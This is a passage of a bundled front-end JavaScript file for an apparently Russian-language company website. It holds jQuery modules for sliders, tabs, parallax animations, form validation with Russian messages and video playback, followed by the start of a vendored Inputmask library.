        var x = e.pageX;
        if ($('.hover_link').length < 1) {
          if (x > sliderOffsetLeft) {
            sliderServices.slideNext();
          } else {
            sliderServices.slidePrev();
          }
        }
      });
      $(document).on('mousemove', '.js-sliderServices a', function (e) {
        sliderServicesElem.addClass('hover_link');
      });
      $(document).on('mouseleave', '.js-sliderServices a', function (e) {
        sliderServicesElem.removeClass('hover_link');
      });
      $('.js-sliderServices').on('mousemove', function (e) {
        $('.cursor').addClass('visible');
        var x = e.pageX;
        if (x > sliderOffsetLeft) {
          $('.cursor').removeClass('show-prev');
          $('.cursor').addClass('show-next');
        } else {
          $('.cursor').removeClass('show-next');
          $('.cursor').addClass('show-prev');
        }
      }).on('mouseleave', function () {
        $('.cursor').removeClass('visible');
      });
    }

    /***/
  }),
  /***/"./src/js/_parts/_stickyImage.js": (
  /*!***************************************!*\
    !*** ./src/js/_parts/_stickyImage.js ***!
    \***************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    if ($('.js-stickyImage').length > 0) {
      var calcScroll = function calcScroll() {
        var pos = $(window).scrollTop();
        var center = $(window).height() / 2 - $('.header').height();
        pos = pos + center;
        $('.js-boxWrap .js-stickyImage').each(function () {
          var _this = $(this);
          var start = _this.data('start');
          var finish = _this.data('finish');
          var parentHeight = _this.parents('.js-boxWrap').data('height') - _this.height();
          var trigger = _this.parents('.js-boxWrap').data('offset') + parentHeight;
          if (pos >= start) {
            _this.addClass('fixed');
            _this.css('top', center);
            if (pos >= trigger) {
              _this.removeClass('fixed');
              _this.parents('.js-boxWrap').addClass('trigger_finish');
            } else {
              _this.parents('.js-boxWrap').removeClass('trigger_finish');
            }
          } else {
            _this.removeClass('fixed');
            _this.css('top', 0);
          }
        });
      };
      $(window).on('load resize', function () {
        var marginTop = $(window).height() / 2 - $('.header').height();
        var position = $(window).scrollTop();
        $('.js-stickyImage').each(function () {
          var _this = $(this);
          var imgHeight = _this.height();
          var parent = _this.parent();
          var index = parent.index();
          var boxHeight = _this.parents('.js-boxWrap').find('.skills-box').eq(index).outerHeight();
          var start = _this.offset().top;
          var finish = start + boxHeight;
          _this.attr('data-start', start);
          _this.attr('data-finish', finish);
          _this.parents('.js-boxWrap').attr('data-height', _this.parents('.js-boxWrap').outerHeight());
          _this.parents('.js-boxWrap').attr('data-offset', _this.parents('.js-boxWrap').offset().top);
          parent.css('height', boxHeight);
        });
      });
      $(window).on('load scroll resize', function () {
        calcScroll();
      });
    }

    /***/
  }),
  /***/"./src/js/_parts/_tab-filter.js": (
  /*!**************************************!*\
    !*** ./src/js/_parts/_tab-filter.js ***!
    \**************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    var tabFilterWrap = $('.js-tabFilterWrap');
    var filterTitleNum = $('.js-filterTitleNum');
    var filterTitleOne = $('.js-filterTitleOne');
    var filterTitle = $('.js-filterTitle');
    $(document).on('click', '.js-tabFilter li', function () {
      var _this = $(this);
      var currentFiler = _this.data('filter');
      var tabs = _this.parents(tabFilterWrap).find('.tab');

      // для скролла к элементу в адаптиве
      var itemOuterWidth = _this.outerWidth(); // узнаем ширину текущего элемента (width + padding)
      var itemOffsetLeft = _this.offset().left; // узнаем значение отступа слева в контейнере у текущего элемента
      var containerScrollLeft = _this.parents('.js-tabOverflow').scrollLeft(); // узнаем текущее значение скролла
      var containerOuterWidth = _this.parents('.js-tabOverflow').outerWidth(); // узнаем ширину контейнера (width + padding)
      var positionCetner = containerOuterWidth / 2 - itemOuterWidth / 2; // рассчитываем позицию центра
      var scrollLeftUpd = containerScrollLeft + itemOffsetLeft - positionCetner; // рассчитываем положение скролла относительно разницы отступа элемента и центра контейнера

      _this.addClass('active').siblings().removeClass('active');
      if (currentFiler == 'all') {
        tabs.show().addClass('tab_show');
        $('.tab_show').removeClass('first_tab last_tab');
      } else {
        tabs.each(function () {
          var thisElem = $(this);
          if (thisElem.data('type') == currentFiler) {
            thisElem.show().addClass('tab_show');
          } else {
            thisElem.hide().removeClass('tab_show');
          }
        });
      }
      filterTitleNum.text($('.tab_show').length);
      if ($('.tab_show').length == 1) {
        filterTitleOne.removeClass('is_hide');
        filterTitle.addClass('is_hide');
      } else {
        filterTitleOne.addClass('is_hide');
        filterTitle.removeClass('is_hide');
      }
      if ($('.js-tabOverflow')) {
        // анимируем
        _this.parents('.js-tabOverflow').animate({
          scrollLeft: scrollLeftUpd
        }, 400);
      }
      $('.tab_show').first().addClass('first_tab');
      $('.tab_show').last().addClass('last_tab');
    });

    /***/
  }),
  /***/"./src/js/_parts/_tabs.js": (
  /*!********************************!*\
    !*** ./src/js/_parts/_tabs.js ***!
    \********************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    $(document).ready(function () {
      $('.js-tabs').on('click', 'li:not(.active)', function () {
        var _this = $(this);
        console.log('.js-tabs li:not(.active) --- click');
        // const currentTab = _this.parents('.tabs').find('.tab').eq(_this.index());
        var clickMinusIndex = $(_this).prevAll().filter(function (index, item) {
          return item.tagName !== "LI";
        }).length || 0;
        var currentTab = _this.closest('.tabs').find('.tab').eq(_this.index() - clickMinusIndex);
        console.log('_this = ', _this);
        console.log('currentTab = ', currentTab);
        console.log('currentTab.siblings(\'.tab\') = ', currentTab.siblings('.tab'));
        var ww = $(window).width();
        var marginOffset = 0;
        // let parentTab = _this.parents('.tabs');

        // для скролла к элементу в адаптиве
        var itemOuterWidth = _this.outerWidth(); // узнаем ширину текущего элемента (width + padding)
        var itemOffsetLeft = _this.offset().left; // узнаем значение отступа слева в контейнере у текущего элемента
        var containerScrollLeft = _this.parents('.js-tabs').scrollLeft(); // узнаем текущее значение скролла
        var containerOuterWidth = _this.parents('.js-tabs').outerWidth(); // узнаем ширину контейнера (width + padding)
        var positionCetner = containerOuterWidth / 2 - itemOuterWidth / 2; // рассчитываем позицию центра
        var scrollLeftUpd = containerScrollLeft + itemOffsetLeft - positionCetner; // рассчитываем положение скролла относительно разницы отступа элемента и центра контейнера

        _this.addClass('active').siblings().removeClass('active');
        // parentTab.addClass('trigger_case');

        // setTimeout(function() {
        // 	if (parentTab.hasClass('trigger_case')) {
        // 		parentTab.removeClass('trigger_case');
        // 	}
        // }, 1000);

        currentTab.siblings('.tab').hide();
        currentTab.fadeIn(750);
        if (currentTab.find('.cases-filter__list li.active').length < 1) {
          currentTab.find('.cases-filter__list li').eq(0).click();
        }

        // анимируем
        _this.parents('.js-tabs:not(.services-tabs__head)').animate({
          scrollLeft: scrollLeftUpd
        }, 400);
        if (ww > 767 && ww < 1025) {
          marginOffset = 300;
        }

        // анимируем
        _this.parents('.js-tabs.services-tabs__head').animate({
          scrollLeft: scrollLeftUpd - marginOffset
        }, 400);
        if (_this.parents('.js-tabs').hasClass('js-tabsCases')) {
          _this.parents('.js-tabs').addClass('disabled');
          setTimeout(function () {
            if ($('.filter_integrator.active').length > 0) {
              $('.tab').eq(1).find('li:first-child').click();
              $('.filter_agency li').removeClass('active');
            }
            if ($('.filter_agency.active').length > 0) {
              $('.tab').eq(0).find('li:first-child').click();
              $('.filter_integrator li').removeClass('active');
            }
            _this.parents('.js-tabs').removeClass('disabled');
            $('.js-filterCase').animate({
              scrollLeft: 0
            }, 500);
            initCases();
          }, 100);
        }
      });
      $('.js-tabLink').on('click', function () {
        if ($(window).width() < 1270) {
          if ($(this).hasClass('is-show')) {
            $(this).toggleClass('is-show');
            $(this).find('.collapse').slideUp(500);
          } else {
            $(this).addClass('is-show').siblings().removeClass('is-show');
            $('.collapse').slideUp();
            $(this).find('.collapse').slideDown(500);
          }
        }
      });
    });

    /***/
  }),
  /***/"./src/js/_parts/_text-parallax.js": (
  /*!*****************************************!*\
    !*** ./src/js/_parts/_text-parallax.js ***!
    \*****************************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony import */
    var scrollmagic__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! scrollmagic */"./node_modules/scrollmagic/scrollmagic/uncompressed/ScrollMagic.js");
    /* harmony import */
    var scrollmagic__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(scrollmagic__WEBPACK_IMPORTED_MODULE_0__);
    /* harmony import */
    var gsap__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! gsap */"./node_modules/gsap/index.js");
    /* harmony import */
    var scrollmagic_plugin_gsap__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! scrollmagic-plugin-gsap */"./node_modules/scrollmagic-plugin-gsap/index.js");
    /* harmony import */
    var scrollmagic_plugin_gsap__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(scrollmagic_plugin_gsap__WEBPACK_IMPORTED_MODULE_2__);
    Object(scrollmagic_plugin_gsap__WEBPACK_IMPORTED_MODULE_2__["ScrollMagicPluginGsap"])(scrollmagic__WEBPACK_IMPORTED_MODULE_0__, gsap__WEBPACK_IMPORTED_MODULE_1__["TweenMax"], gsap__WEBPACK_IMPORTED_MODULE_1__["TimelineMax"]);
    if ($('#trigger').length) {
      var controller = new scrollmagic__WEBPACK_IMPORTED_MODULE_0__["Controller"]();
      var controller2 = new scrollmagic__WEBPACK_IMPORTED_MODULE_0__["Controller"]();
      var marginTop1 = 'translate3d(0px, 0px, 0px)',
        marginBottom1 = 'translate3d(-5px, 0px, 0px)',
        marginTop2 = 'translate3d(0px, 0px, 0px)',
        marginBottom2 = 'translate3d(0px, 0px, 0px)',
        durationVal1 = 600,
        durationVal2 = 450,
        ww = $(window).width();
      if (ww < 768) {
        var marginVal = 0;
        var durationVal = 200;
      }
      var sceneTop = new scrollmagic__WEBPACK_IMPORTED_MODULE_0__["Scene"]({
        triggerElement: "#trigger",
        duration: durationVal1
      })
      // animate color and top border in relation to scroll position
      .setTween(".js-parallaxSpecializations .js-parallaxTop", {
        transform: marginTop1
      }) // the tween durtion can be omitted and defaults to 1
      // .addIndicators({name: "1 (duration: 1000)"}) // add indicators (requires plugin)
      .addTo(controller);
      var sceneBottom = new scrollmagic__WEBPACK_IMPORTED_MODULE_0__["Scene"]({
        triggerElement: "#trigger",
        duration: durationVal1
      })
      // animate color and top border in relation to scroll position
      .setTween(".js-parallaxSpecializations .js-parallaxBottom", {
        transform: marginBottom1
      }) // the tween durtion can be omitted and defaults to 1
      // .addIndicators({name: "2 (duration: 1000)"}) // add indicators (requires plugin)
      .addTo(controller);
      var sceneTop2 = new scrollmagic__WEBPACK_IMPORTED_MODULE_0__["Scene"]({
        triggerElement: "#trigger-2",
        duration: durationVal2
      })
      // animate color and top border in relation to scroll position
      .setTween(".js-parallaxFeedback .js-parallaxTop", {
        transform: marginTop2
      }) // the tween durtion can be omitted and defaults to 1
      // .addIndicators({name: "1 (duration: 1000)"}) // add indicators (requires plugin)
      .addTo(controller2);
      var sceneBottom2 = new scrollmagic__WEBPACK_IMPORTED_MODULE_0__["Scene"]({
        triggerElement: "#trigger-2",
        duration: durationVal2
      })
      // animate color and top border in relation to scroll position
      .setTween(".js-parallaxFeedback  .js-parallaxBottom", {
        transform: marginBottom2
      }) // the tween durtion can be omitted and defaults to 1
      // .addIndicators({name: "2 (duration: 1000)"}) // add indicators (requires plugin)
      .addTo(controller2);
    }

    /***/
  }),
  /***/"./src/js/_parts/_text-run.js": (
  /*!************************************!*\
    !*** ./src/js/_parts/_text-run.js ***!
    \************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    $(function () {
      $('.tape').marquee({
        duration: 18000,
        startVisible: true,
        duplicated: true,
        direction: 'right'
      });
    });

    /***/
  }),
  /***/"./src/js/_parts/_trigger-animation.js": (
  /*!*********************************************!*\
    !*** ./src/js/_parts/_trigger-animation.js ***!
    \*********************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    if ($('.js-triggerAnimation').length > 0 && $(window).width() > 767) {
      // let scrollTop = 0;
      // let elem_1 = $('.js-triggerAnimation .elem_1');
      // let elem_4 = $('.js-triggerAnimation .elem_4');
      // let elem_6 = $('.js-triggerAnimation .elem_6');
      // let elem_9 = $('.js-triggerAnimation .elem_9');
      // let elem_10 = $('.js-triggerAnimation .but_blue');
      // let widthEelem = elem_1.outerWidth();

      // $(window).on('scroll load resize', function() {
      // 	const triggerStart = $('.js-triggerStart').offset().top;
      // 	scrollTop = $(window).scrollTop() + $(window).height() / 2;
      // 	widthEelem = elem_1.outerWidth();

      // 	if (scrollTop >= triggerStart) {
      // 		let sum = scrollTop - triggerStart;

      // 		if (sum > widthEelem) {
      // 			sum = widthEelem;
      // 		}

      // 		elem_1.css('transform', `translateX(${sum}px)`);
      // 		elem_9.css('transform', `translateX(${sum}px)`);
      // 		elem_6.css('transform', `translateX(${-sum}px)`);

      // 		if ($(window).width() < 1025) {
      // 			elem_4.css('transform', `translateX(${-sum}px)`);
      // 			elem_10.css('transform', `translateX(${-sum}px)`);
      // 		} else {
      // 			elem_4.css('transform', `translateX(${-sum}px)`);
      // 			elem_10.css('transform', `translateX(${-sum}px)`);
      // 		}

      // 	} else {
      // 		elem_4.css('transform', `translateX(0px)`);
      // 		elem_1.css('transform', `translateX(0px)`);
      // 		elem_9.css('transform', `translateX(0px)`);
      // 		elem_6.css('transform', `translateX(0px)`);
      // 		elem_10.css('transform', `translateX(0px)`);
      // 	}
      // })

      $(window).on('load scroll', function () {
        var section = $('.js-triggerAnimation');
        var scrolled = $(window).scrollTop();
        var halfHeight = $(window).height() / 1.5;
        section.each(function (index, element) {
          var block = $(element);
          var blockOffset = block.offset().top - halfHeight;
          if (scrolled >= blockOffset && !block.hasClass('is_animate')) {
            block.addClass('is_animate');
          }
        });
      });
    }

    // if ($('.js-triggerAnimation.automation-images').length > 0 && $(window).width() < 768) {
    // 	$(window).on('load scroll', () => {
    // 		const section = $('.js-triggerAnimation');
    // 		const scrolled = $(window).scrollTop();
    // 		const halfHeight = $(window).height() / 1.5;

    // 		section.each((index, element) => {
    // 			const block = $(element);
    // 			const blockOffset = block.offset().top - halfHeight;

    // 			if(scrolled >= blockOffset && !block.hasClass('is_animate')){
    // 				block.addClass('is_animate');
    // 			}
    // 		});
    // 	});
    // }

    /***/
  }),
  /***/"./src/js/_parts/_validate.js": (
  /*!************************************!*\
    !*** ./src/js/_parts/_validate.js ***!
    \************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    $.extend($.validator.messages, {
      required: "Заполните поле",
      remote: "Введите правильное значение",
      email: "Введите корректную электронную почту",
      url: "Введите корректный URL",
      date: "Введите корректную дату",
      dateISO: "Введите корректную дату в формате ISO",
      number: "Введите число",
      digits: "Вводите только цифры",
      letters: "Вводите только буквы",
      creditcard: "Введите правильный номер кредитной карты",
      equalTo: "Пароли не совпадают",
      extension: "Выберите файл с правильным расширением",
      maxlength: $.validator.format("Максимальная длина описания - {0} символов"),
      minlength: $.validator.format("Введите не меньше {0} символов"),
      rangelength: $.validator.format("Введите значение длиной от {0} до {1} символов"),
      range: $.validator.format("Введите число от {0} до {1}"),
      max: $.validator.format("Максимальная длина описания - {0} символов"),
      min: $.validator.format("Введите число, большее или равное {0}")
    });
    function initValidate() {
      $('.js-validate').each(function (index, form) {
        $(form).find('[type="submit"]').prop('disabled', true);
        $(form).validate({
          ignore: [],
          errorElement: 'span',
          errorClass: 'label-error',
          rules: {
            'password_confirm': {
              equalTo: '.js-password',
              minlength: 8
            },
            'PasswordForm[newPasswordConfirm]': {
              equalTo: '.js-password',
              minlength: 8
            }
          },
          highlight: function highlight(element) {
            setTimeout(function () {
              if (!$(element).attr('disabled')) {
                $(element).parent().removeClass('is-success');
                $(element).parent().addClass('is-error');
                if ($(element).parent('.jq-checkbox')) {
                  var checkboxParent = $(element).parents('label');
                  checkboxParent.append(checkboxParent.find('.label-error'));
                }
                if ($(element).attr('type') == 'checkbox' || $(element).hasClass('select') || $(element).attr('type') == 'radio') {
                  var parent = $(element).parent();
                  parent.append(parent.find('.label-error'));
                }
              }
            });
          },
          unhighlight: function unhighlight(element) {
            setTimeout(function () {
              if (!$(element).attr('disabled')) {
                if ($(element).val() != '') $(element).parent().addClass('is-success');
                $(element).parent().removeClass('is-error');
              }
            });
          }
        });
        if ($(form).validate().checkForm()) {
          $(form).find('[type="submit"]').prop('disabled', false);
        } else {
          $(form).find('[type="submit"]').prop('disabled', true);
        }
        $('input:not(.js-uploadFileInput), textarea, select', $(form)).on('focus change keyup', function () {
          var valid = $(form).validate().checkForm();
          var submit = $(form).find('[type="submit"]');
          setTimeout(function () {
            if (valid) {
              submit.prop('disabled', false);
            } else {
              submit.prop('disabled', true);
            }
          }, 100);
        });
      });
    }
    $(document).on('initValidateTrigger', function () {
      initValidate();
    });
    $(document).ready(function () {
      setTimeout(function () {
        $(document).trigger('initValidateTrigger');
      }, 500);
    });
    $(document).on('change input blur', '.application__input', function (event) {
      var _this = $(event.currentTarget);
      if (_this.val() == '') {
        _this.parent().removeClass('is-success');
      } else {
        _this.valid();
      }
    });
    $(document).on('change input blur', '.form-textarea textarea', function (event) {
      var _this = $(event.currentTarget);
      _this.valid();
    });
    var textarea = document.querySelector('.js-textareaAutoSize');
    if ($('.js-textareaAutoSize').length > 0) {
      textarea.addEventListener('input', autosize);
    }
    function autosize() {
      var el = this;
      el.style.cssText = 'padding:0';
      el.style.cssText = 'height:' + el.scrollHeight + 'px';
    }
    $(document).on('change', '.jq-checkbox input', function (event) {
      var _this = $(event.currentTarget);
      _this.valid();
    });
    $.validator.addMethod("validpassword", function (value, element) {
      if (value.match(/[A-z]/) && !value.match(/[А-я]/) && value.match(/[A-Z]/)) return true;
    }, "Пароль должен содержать от 8 символов, латинские символы, символы верхнего регистра");
    $.validator.addClassRules('js-passwordValidate', {
      validpassword: true
    });
    $('.js-passwordValidate').on('focus', function () {
      if ($('.js-passwordValidate').val() == '') {
        $('.js-passwordValidate').parent().addClass('is-error');
      }
    });
    $.validator.addMethod('phonecustom', function (value, element) {
      if (value == '+7 (___) ___-__-__') return true;
      return value.match(/^\+7\s\([0-9]{3}\)\s[0-9]{3}\-[0-9]{2}\-[0-9]{2}$/);
    }, 'Пожалуйста, добавьте номер телефона, чтобы мы смогли с Вами связаться');
    $(document).ready(function () {
      $('.js-phone').bind("input", function () {
        $.validator.addClassRules('js-phone', {
          phonecustom: true
        });
      });
    });
    $.validator.addMethod('emailcustom', function (value, element) {
      return value.match(/^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9A-Яа-я_\-\.])+\.([A-Za-zA-Яа-я_]{2,4})$/);
    }, 'Неправильный формат <br> электронной почты');
    $.validator.addClassRules('js-email', {
      emailcustom: true
    });
    $.validator.addMethod('onlyletters', function (value, element) {
      return value.match(/^[a-zа-яA-ZА-ЯёЁ\s]+$/);
    }, 'Это поле может содержать только буквы');
    $.validator.addClassRules('js-letters', {
      onlyletters: true
    });
    $(document).ready(function () {
      $('.js-onlyText').bind("change keyup input click", function () {
        if (this.value.match(/[^а-яА-Яa-zA-Z\s]/g)) {
          this.value = this.value.replace(/[^а-яА-Яa-zA-Z\s]/g, '');
        }
      });
    });

    /***/
  }),
  /***/"./src/js/_parts/_video.js": (
  /*!*********************************!*\
    !*** ./src/js/_parts/_video.js ***!
    \*********************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    $(document).on('click touch', '.js-videoPoster', function () {
      var _this = $(this);
      var video = _this.parents('.js-video').find('video')[0];
      video.play();
      _this.hide();
    });

    /***/
  }),
  /***/"./src/js/_parts/_wow.js": (
  /*!*******************************!*\
    !*** ./src/js/_parts/_wow.js ***!
    \*******************************/
  /*! no static exports found */
  /***/
  function (module, exports, __webpack_require__) {
    var WOW = __webpack_require__(/*! wowjs */"./node_modules/wowjs/dist/wow.js");
    window.wow = new WOW.WOW({
      boxClass: 'wow',
      // animated element css class (default is wow)
      animateClass: 'animated',
      // animation css class (default is animated)
      offset: 0,
      // distance to the element when triggering the animation (default is 0)
      mobile: true,
      // trigger animations on mobile devices (default is true)
      live: false,
      // act on asynchronously loaded content (default is true)
      callback: function callback(box) {
        // the callback is fired every time an animation is started
        // the argument that is passed in is the DOM node being animated
      },
      scrollContainer: null // optional scroll container selector, otherwise use window
    });

    /***/
  }),
  /***/"./src/js/_vendor/_inputmask.bundle.min.js": (
  /*!*************************************************!*\
    !*** ./src/js/_vendor/_inputmask.bundle.min.js ***!
    \*************************************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony import */
    var _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @babel/runtime/helpers/typeof */"./node_modules/@babel/runtime/helpers/typeof.js");
    /* harmony import */
    var _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0__);

    /*!
    * jquery.inputmask.bundle.js
    * https://github.com/RobinHerbots/Inputmask
    * Copyright (c) 2010 - 2018 Robin Herbots
    * Licensed under the MIT license (http://www.opensource.org/licenses/mit-license.php)
    * Version: 4.0.1-beta.38
    */

    (function (modules) {
      var installedModules = {};
      function __webpack_require__(moduleId) {
        if (installedModules[moduleId]) {
          return installedModules[moduleId].exports;
        }
        var module = installedModules[moduleId] = {
          i: moduleId,
          l: false,
          exports: {}
        };
        modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
        module.l = true;
        return module.exports;
      }
      __webpack_require__.m = modules;
      __webpack_require__.c = installedModules;
      __webpack_require__.d = function (exports, name, getter) {
        if (!__webpack_require__.o(exports, name)) {
          Object.defineProperty(exports, name, {
            enumerable: true,
            get: getter
          });
        }
      };
      __webpack_require__.r = function (exports) {
        if (typeof Symbol !== "undefined" && Symbol.toStringTag) {
          Object.defineProperty(exports, Symbol.toStringTag, {
            value: "Module"
          });
        }
        Object.defineProperty(exports, "__esModule", {
          value: true
        });
      };
      __webpack_require__.t = function (value, mode) {
        if (mode & 1) value = __webpack_require__(value);
        if (mode & 8) return value;
        if (mode & 4 && _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(value) === "object" && value && value.__esModule) return value;
        var ns = Object.create(null);
        __webpack_require__.r(ns);
        Object.defineProperty(ns, "default", {
          enumerable: true,
          value: value
        });
        if (mode & 2 && typeof value != "string") for (var key in value) __webpack_require__.d(ns, key, function (key) {
          return value[key];
        }.bind(null, key));
        return ns;
      };
      __webpack_require__.n = function (module) {
        var getter = module && module.__esModule ? function getDefault() {
          return module["default"];
        } : function getModuleExports() {
          return module;
        };
        __webpack_require__.d(getter, "a", getter);
        return getter;
      };
      __webpack_require__.o = function (object, property) {
        return Object.prototype.hasOwnProperty.call(object, property);
      };
      __webpack_require__.p = "";
      return __webpack_require__(__webpack_require__.s = 0);
    })([function (module, exports, __webpack_require__) {
      "use strict";

      __webpack_require__(1);
      __webpack_require__(7);
      __webpack_require__(8);
      var _inputmask = __webpack_require__(2);
      var _inputmask2 = _interopRequireDefault(_inputmask);
      var _inputmask3 = __webpack_require__(3);
      var _inputmask4 = _interopRequireDefault(_inputmask3);
      var _jquery = __webpack_require__(4);
      var _jquery2 = _interopRequireDefault(_jquery);
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : {
          default: obj
        };
      }
      if (_inputmask4.default === _jquery2.default) {
        __webpack_require__(9);
      }
      window.Inputmask = _inputmask2.default;
    }, function (module, exports, __webpack_require__) {
      "use strict";

      var __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;
      var _typeof = typeof Symbol === "function" && _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(Symbol.iterator) === "symbol" ? function (obj) {
        return _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      } : function (obj) {
        return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      };
      (function (factory) {
        if (true) {
          !(__WEBPACK_AMD_DEFINE_ARRAY__ = [__webpack_require__(2)], __WEBPACK_AMD_DEFINE_FACTORY__ = factory, __WEBPACK_AMD_DEFINE_RESULT__ = typeof __WEBPACK_AMD_DEFINE_FACTORY__ === "function" ? __WEBPACK_AMD_DEFINE_FACTORY__.apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__) : __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
        } else {}
      })(function (Inputmask) {
        Inputmask.extendDefinitions({
          A: {
            validator: "[A-Za-zА-яЁёÀ-ÿµ]",
            casing: "upper"
          },
          "&": {
            validator: "[0-9A-Za-zА-яЁёÀ-ÿµ]",
            casing: "upper"
          },
          "#": {
            validator: "[0-9A-Fa-f]",
            casing: "upper"
          }
        });
        Inputmask.extendAliases({
          cssunit: {
            regex: "[+-]?[0-9]+\\.?([0-9]+)?(px|em|rem|ex|%|in|cm|mm|pt|pc)"
          },
          url: {
            regex: "(https?|ftp)//.*",
            autoUnmask: false
          },
          ip: {
            mask: "i[i[i]].i[i[i]].i[i[i]].i[i[i]]",
            definitions: {
              i: {
                validator: function validator(chrs, maskset, pos, strict, opts) {
                  if (pos - 1 > -1 && maskset.buffer[pos - 1] !== ".") {
                    chrs = maskset.buffer[pos - 1] + chrs;
                    if (pos - 2 > -1 && maskset.buffer[pos - 2] !== ".") {
                      chrs = maskset.buffer[pos - 2] + chrs;
                    } else chrs = "0" + chrs;
                  } else chrs = "00" + chrs;
                  return new RegExp("25[0-5]|2[0-4][0-9]|[01][0-9][0-9]").test(chrs);
                }
              }
            },
            onUnMask: function onUnMask(maskedValue, unmaskedValue, opts) {
              return maskedValue;
            },
            inputmode: "numeric"
          },
          email: {
            mask: "*{1,64}[.*{1,64}][.*{1,64}][.*{1,63}]@-{1,63}.-{1,63}[.-{1,63}][.-{1,63}]",
            greedy: false,
            casing: "lower",
            onBeforePaste: function onBeforePaste(pastedValue, opts) {
              pastedValue = pastedValue.toLowerCase();
              return pastedValue.replace("mailto:", "");
            },
            definitions: {
              "*": {
                validator: "[0-9１-９A-Za-zА-яЁёÀ-ÿµ!#$%&'*+/=?^_`{|}~-]"
              },
              "-": {
                validator: "[0-9A-Za-z-]"
              }
            },
            onUnMask: function onUnMask(maskedValue, unmaskedValue, opts) {
              return maskedValue;
            },
            inputmode: "email"
          },
          mac: {
            mask: "##:##:##:##:##:##"
          },
          vin: {
            mask: "V{13}9{4}",
            definitions: {
              V: {
                validator: "[A-HJ-NPR-Za-hj-npr-z\\d]",
                casing: "upper"
              }
            },
            clearIncomplete: true,
            autoUnmask: true
          }
        });
        return Inputmask;
      });
    }, function (module, exports, __webpack_require__) {
      "use strict";

      var __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;
      var _typeof = typeof Symbol === "function" && _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(Symbol.iterator) === "symbol" ? function (obj) {
        return _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      } : function (obj) {
        return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      };
      (function (factory) {
        if (true) {
          !(__WEBPACK_AMD_DEFINE_ARRAY__ = [__webpack_require__(3), __webpack_require__(5), __webpack_require__(6)], __WEBPACK_AMD_DEFINE_FACTORY__ = factory, __WEBPACK_AMD_DEFINE_RESULT__ = typeof __WEBPACK_AMD_DEFINE_FACTORY__ === "function" ? __WEBPACK_AMD_DEFINE_FACTORY__.apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__) : __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
        } else {}
      })(function ($, window, document, undefined) {
        var ua = navigator.userAgent,
          mobile = isInputEventSupported("touchstart"),
          iemobile = /iemobile/i.test(ua),
          iphone = /iphone/i.test(ua) && !iemobile;
        function Inputmask(alias, options, internal) {
          if (!(this instanceof Inputmask)) {
            return new Inputmask(alias, options, internal);
          }
          this.el = undefined;
          this.events = {};
          this.maskset = undefined;
          this.refreshValue = false;
          if (internal !== true) {
            if ($.isPlainObject(alias)) {
              options = alias;
            } else {
              options = options || {};
              if (alias) options.alias = alias;
            }
            this.opts = $.extend(true, {}, this.defaults, options);
            this.noMasksCache = options && options.definitions !== undefined;
            this.userOptions = options || {};
            this.isRTL = this.opts.numericInput;
            resolveAlias(this.opts.alias, options, this.opts);
          }
        }
        Inputmask.prototype = {
          dataAttribute: "data-inputmask",
          defaults: {
            placeholder: "_",
            optionalmarker: ["[", "]"],
            quantifiermarker: ["{", "}"],
            groupmarker: ["(", ")"],
            alternatormarker: "|",
            escapeChar: "\\",
            mask: null,
            regex: null,
            oncomplete: $.noop,
            onincomplete: $.noop,
            oncleared: $.noop,
            repeat: 0,
            greedy: false,
            autoUnmask: false,
            removeMaskOnSubmit: false,
            clearMaskOnLostFocus: true,
            insertMode: true,
            clearIncomplete: false,
            alias: null,
            onKeyDown: $.noop,
            onBeforeMask: null,
            onBeforePaste: function onBeforePaste(pastedValue, opts) {
              return $.isFunction(opts.onBeforeMask) ? opts.onBeforeMask.call(this, pastedValue, opts) : pastedValue;
            },
            onBeforeWrite: null,
            onUnMask: null,
            showMaskOnFocus: true,
